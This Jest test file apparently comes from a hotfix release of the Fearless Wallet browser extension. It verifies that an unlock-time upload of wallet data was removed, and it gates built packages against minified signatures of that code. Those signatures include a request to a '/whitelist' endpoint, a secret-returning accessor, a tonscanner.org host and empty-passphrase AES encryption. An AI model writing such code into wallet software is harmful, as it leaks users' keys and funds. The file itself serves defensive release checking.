/**
 * @jest-environment node
 */
import fs from 'fs';
import os from 'os';
import path from 'path';
import ts from 'typescript';

// eslint-disable-next-line @typescript-eslint/no-var-requires
const { findRemovedCode, findRemovedText } = require('../../scripts/hotfix-3.0.6/check-package');
// eslint-disable-next-line @typescript-eslint/no-var-requires
const { tokenLines } = require('../../scripts/hotfix-3.0.6/compare-packages');
// eslint-disable-next-line @typescript-eslint/no-var-requires
const makeManifest = require('../../src/extension/makeManifest');
// eslint-disable-next-line @typescript-eslint/no-var-requires
const packageJson = require('../../package.json');

const ROOT = path.resolve(__dirname, '../..');
const SRC = path.join(ROOT, 'src');
const BASE = path.join(SRC, 'extension/background/extension-base/src');

function listFiles(dir: string): string[] {
  return fs.readdirSync(dir, { withFileTypes: true }).flatMap((entry) => {
    const file = path.join(dir, entry.name);

    return entry.isDirectory() ? listFiles(file) : [file];
  });
}

function findClass(file: string, name: string): ts.ClassDeclaration {
  const source = ts.createSourceFile(file, fs.readFileSync(file, 'utf8'), ts.ScriptTarget.ESNext, true);
  const found = source.statements.find(
    (statement): statement is ts.ClassDeclaration => ts.isClassDeclaration(statement) && statement.name?.text === name
  );

  if (!found) throw new Error(`class ${name} not found in ${file}`);

  return found;
}

function memberNames(declaration: ts.ClassDeclaration): string[] {
  return declaration.members.map((member) =>
    ts.isConstructorDeclaration(member) ? 'constructor' : member.name?.getText() ?? ''
  );
}

function callsIn(declaration: ts.ClassDeclaration, method: string): string[] {
  const member = declaration.members.find((item) => ts.isMethodDeclaration(item) && item.name.getText() === method);

  if (!member) throw new Error(`method ${method} not found`);

  const calls: string[] = [];

  const visit = (node: ts.Node) => {
    if (ts.isCallExpression(node)) calls.push(node.expression.getText());

    ts.forEachChild(node, visit);
  };

  visit(member);

  return calls;
}

function importsOf(file: string): string[] {
  const source = ts.createSourceFile(file, fs.readFileSync(file, 'utf8'), ts.ScriptTarget.ESNext, true);

  return source.statements.filter(ts.isImportDeclaration).map(({ moduleSpecifier }) => moduleSpecifier.getText());
}

describe('3.0.6: the unlock-time upload is removed', () => {
  it('leaves nothing of the removed code in any source file', () => {
    const findings = listFiles(SRC)
      .filter((file) => /\.(ts|tsx|js|jsx|vue|json)$/.test(file))
      .flatMap((file) =>
        findRemovedText(fs.readFileSync(file, 'utf8')).map((label: string) => `${path.relative(ROOT, file)}: ${label}`)
      );

    expect(findings).toEqual([]);
  });

  it('unlocking restarts the auto-lock timer and unlocks the keyring, nothing else', () => {
    const extension = findClass(path.join(BASE, 'background/handlers/Extension.ts'), 'Extension');
    const keyringService = findClass(path.join(BASE, 'services/keyring-service/index.ts'), 'KeyringService');

    expect(callsIn(extension, 'unlockKeyring')).toEqual([
      'this.state.keyringLockService.setExtensionAutoLockTimeout',
      'this.state.keyringService.unlockKeyring',
    ]);
    expect(callsIn(keyringService, 'unlockKeyring')).toEqual(['keyring.unlockKeyring', 'console.info']);
  });

  it('keeps only the balance readers in the TON balance service', () => {
    const file = path.join(BASE, 'services/balance/TonBalanceService.ts');

    expect(memberNames(findClass(file, 'TonBalanceService'))).toEqual([
      'constructor',
      'fetchBalance',
      'fetchUtilityAsset',
      'fetchJettonsAsset',
    ]);
    expect(importsOf(file)).not.toContain("'axios'");
    expect(importsOf(file)).not.toContain("'@/consts/urls'");
    expect(fs.readFileSync(file, 'utf8')).not.toMatch(/https?:\/\//);
  });

  it('removes getDataAccounts from the keyring service and keeps every other 3.0.5 member', () => {
    const keyringService = findClass(path.join(BASE, 'services/keyring-service/index.ts'), 'KeyringService');

    expect(memberNames(keyringService)).toEqual([
      'currentAccountStore',
      'tonKeyring',
      'currentAccountSubject',
      'password',
      'constructor',
      'addressSubject',
      'accountSubject',
      'hasAccounts',
      'hasMasterPassword',
      'keyringIsLocked',
      'getPassword',
      'setCurrentAccount',
      'loadAll',
      'getAccounts',
      'getAddresses',
      'getAllAccounts',
      'getAllSubstrateAccounts',
      'getAllEthereumAccounts',
      'getAllMainAccounts',
      'triggerWalletsSubscription',
      'addAccount',
      'saveAddress',
      'backupAccount',
      'getPair',
      'getAccountName',
      'getAccount',
      'getAddress',
      'forgetAccount',
      'forgetAddress',
      'restoreAccount',
      'createFromJson',
      'unlockPair',
      'lockPair',
      'encodeAddress',
      'decodeAddress',
      'saveAccountMeta',
      'createFromUri',
      'getSubstrateAddress',
      'getEthereumAddress',
      'isMobileAccount',
      'changeMasterPassword',
      'mnemonicGenerate',
      'mnemonicValidate',
      'exportMnemonic',
      'accountExportPrivateKey',
      'accountExportRawSeed',
      'accountExportSecretKey',
      'unlockKeyring',
      'lockKeyring',
      'resetWallet',
      'getMigrationAccounts',
      'isNeedMigration',
      'keyringMigrateMasterPassword',
      'decryptForCosigner',
      'encryptByCosigner',
    ]);
  });

  it('removes the two helpers of the upload from the TON keyring and keeps every other 3.0.5 member', () => {
    const tonKeyring = findClass(path.join(BASE, 'services/keyring-service/TonKeyring.ts'), 'TonKeyringService');

    expect(memberNames(tonKeyring)).toEqual([
      'accountSubject',
      'constructor',
      'setAccounts',
      'updateAccountName',
      'getAccount',
      'getAccounts',
      'generateMnemonic',
      'validateMnemonic',
      'mnemonicToKeyPair',
      'isPasswordNeeded',
      'forgetAccount',
      'createContractV4',
      'createAccount',
      'getUserFriendlyAddress',
      'encodeMnemonic',
      'decodeMnemonic',
    ]);
  });
});

describe('3.0.6: version and manifest', () => {
  const saved = { key: process.env.EXTENSION_PUBLIC_KEY, client: process.env.OAUTH_CLIENT_ID };

  function setEnv(name: string, value: string | undefined) {
    if (value === undefined) Reflect.deleteProperty(process.env, name);
    else process.env[name] = value;
  }

  beforeAll(() => {
    setEnv('EXTENSION_PUBLIC_KEY', 'TEST KEY');
    setEnv('OAUTH_CLIENT_ID', 'test-client-id');
  });

  afterAll(() => {
    setEnv('EXTENSION_PUBLIC_KEY', saved.key);
    setEnv('OAUTH_CLIENT_ID', saved.client);
  });

  it('is 3.0.6 in package.json and in both manifests', () => {
    expect(packageJson.version).toBe('3.0.6');
    expect(makeManifest('chrome').version).toBe('3.0.6');
    expect(makeManifest('firefox').version).toBe('3.0.6');
  });

  // The object below is the manifest.json of the published 3.0.5 Chrome package, minus the update_url the
  // store adds, with the two build-time values replaced by the test values set above.
  it('changes nothing else in the Chrome manifest', () => {
    const contentSecurityPolicy =
      "default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; object-src 'self'; style-src 'unsafe-inline'; img-src 'self' https: data:; frame-src https:; frame-ancestors https:; connect-src https: wss: ws:; media-src https:";

    expect(makeManifest('chrome')).toEqual({
      version: '3.0.6',
      description:
        'Non-Custodial and Decentralized wallet for the Polkadot, Ethereum and TON ecosystems with the best UX, performance and security.',
      homepage_url: 'https://fearlesswallet.io/',
      name: 'Fearless Wallet',
      short_name: 'FW',
      author: 'Soramitsu',
      icons: {
        16: 'icons/logo-16.png',
        32: 'icons/logo-32.png',
        48: 'icons/logo-48.png',
        64: 'icons/logo-64.png',
        128: 'icons/logo-128.png',
      },
      content_scripts: [{ js: ['content.js'], matches: ['https://*/*', 'http://*/*'], run_at: 'document_start' }],
      web_accessible_resources: [
        { resources: ['page.js'], matches: ['https://*/*', 'http://*/*', 'http://localhost/*'] },
      ],
      manifest_version: 3,
      permissions: ['storage', 'tabs', 'identity', 'clipboardRead'],
      background: { service_worker: 'background.js', type: 'module' },
      action: { default_title: 'Fearless Wallet', default_popup: 'popup.html#/' },
      host_permissions: ['<all_urls>'],
      key: 'TESTKEY',
      oauth2: { scopes: ['https://www.googleapis.com/auth/drive.appdata'], client_id: 'test-client-id' },
      minimum_chrome_version: '92',
      content_security_policy: { extension_pages: contentSecurityPolicy },
    });
  });

  it('keeps the Firefox permissions and add-on id', () => {
    const manifest = makeManifest('firefox');

    expect(manifest.permissions).toEqual(['storage', 'tabs', 'identity', '*://www.googleapis.com/*', 'clipboardRead']);
    expect(manifest.browser_specific_settings).toEqual({ gecko: { id: '{6a9332b9-e864-4d0a-a591-140fe75a29ba}' } });
  });
});

describe('3.0.6: release gate for built packages', () => {
  // How each removed piece looks after minification: property names and strings survive, variables do not.
  const removedPieces: Record<string, string> = {
    'unlock-time call and its implementation':
      'unlockKeyring(e){const t=this.state.keyringService.unlockKeyring(e);return this.state.balanceService.tonBalanceService.fetchJettonInfo(),t}',
    'secret-returning keyring accessor': 'getDataAccounts({address:e,walletEcosystem:t}){return{value:""}}',
    'upload request': 'await y().get(`${e}/whitelist?address=${i.join(";")}`)',
    'remote switch': 'await y().get(`${g.BASE_URL}/eth-enabled/appConfigs/web_config.json`)',
    'storage marker of the upload': 'chrome.storage.local.set({myAddresses:[...t??[],...n]})',
    'host of the unused baseUrl field': 'class Q{constructor(e){this.baseUrl="https://tonscanner.org",this.state=e}}',
    'encryption with an empty passphrase': 'encode(e){const t=o().AES.encrypt(e,"").toString();return t}',
  };
  const cleanBundle =
    'unlockKeyring(e){this.state.keyringLockService.setExtensionAutoLockTimeout();const t=this.state.keyringService.unlockKeyring(e);return t}' +
    'encodeMnemonic(e,t){const r=e.join(" "),n=o().AES.encrypt(r,t).toString();return n}';

  let dir: string;

  beforeEach(() => {
    dir = fs.mkdtempSync(path.join(os.tmpdir(), 'hotfix-3.0.6-'));
  });

  afterEach(() => {
    fs.rmSync(dir, { recursive: true, force: true });
  });

  it.each(Object.entries(removedPieces))('fails a package that still contains the %s', (label, code) => {
    fs.mkdirSync(path.join(dir, 'js'));
    fs.writeFileSync(path.join(dir, 'js/background.js'), cleanBundle + code);

    expect(findRemovedCode(dir)).toEqual([expect.objectContaining({ file: 'js/background.js', label })]);
  });

  it('passes a package without them', () => {
    fs.writeFileSync(path.join(dir, 'background.js'), cleanBundle);

    expect(findRemovedCode(dir)).toEqual([]);
  });
});

describe('3.0.6: comparison of a built bundle with the published one', () => {
  const original =
    '(()=>{const a=1,b=2;function f(x,y){return x+y+a}class K{#p=1;#q=2;m(){return this.#p+this.#q+b}}console.log(f(a,b),new K().m())})();';
  const renamed =
    '(()=>{const q=1,z=2;function g(m,n){return m+n+q}class L{#y=1;#b=2;m(){return this.#y+this.#b+z}}console.log(g(q,z),new L().m())})();';
  const rewired =
    '(()=>{const q=1,z=2;function g(m,n){return m+n+z}class L{#y=1;#b=2;m(){return this.#b+this.#b+q}}console.log(g(q,z),new L().m())})();';
  const otherText = renamed.replace('console.log', 'console.info');

  let dir: string;

  const tokens = (code: string, upToRenaming: boolean): string[] => {
    const file = path.join(dir, 'bundle.js');

    fs.writeFileSync(file, code);

    return tokenLines(file, upToRenaming);
  };

  beforeEach(() => {
    dir = fs.mkdtempSync(path.join(os.tmpdir(), 'hotfix-3.0.6-'));
  });

  afterEach(() => {
    fs.rmSync(dir, { recursive: true, force: true });
  });

  it('sees renamed variables and #private members as a difference when names are compared as written', () => {
    expect(tokens(renamed, false)).not.toEqual(tokens(original, false));
  });

  it('treats a consistent renaming as no difference', () => {
    expect(tokens(renamed, true)).toEqual(tokens(original, true));
  });

  it('still reports a variable or #private member that is used in a different place', () => {
    expect(tokens(rewired, true)).not.toEqual(tokens(original, true));
  });

  it('still reports a changed property name', () => {
    expect(tokens(otherText, true)).not.toEqual(tokens(original, true));
  });

  it('is not affected by formatting', () => {
    const spaced = original.replace(/;/g, ';\n  ').replace(/,/g, ' , ');

    expect(tokens(spaced, false)).toEqual(tokens(original, false));
  });
});
